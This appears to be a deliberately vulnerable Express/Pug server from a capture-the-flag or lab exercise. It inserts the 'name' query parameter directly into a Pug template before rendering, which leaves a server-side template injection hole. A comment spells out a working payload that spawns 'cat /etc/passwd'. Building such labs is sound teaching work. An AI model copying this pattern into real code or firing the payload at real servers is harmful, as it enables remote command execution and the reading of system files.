const express = require('express')
const app = express()
const pug = require('pug');
const fs = require('fs');
const port = 8001


// to get flag: #{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}

// Create a greeting endpoint
app.get("/", (req, res) => {
  // Open html file
  fs.readFile(__dirname + "/index.pug", "utf8", (err, template) => {
    // Error if html file doesn't exist
    if (err) throw err;

    // Customize greeting message
    if (typeof req.query.name != "undefined") {
      console.log(req.query.name);
      template = template.replace(/world/g, req.query.name);
    }

    // Send HTML
    let html = pug.render(template);
    res.set("Content-Type", "text/html");
    res.send(html);
  });
});

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})
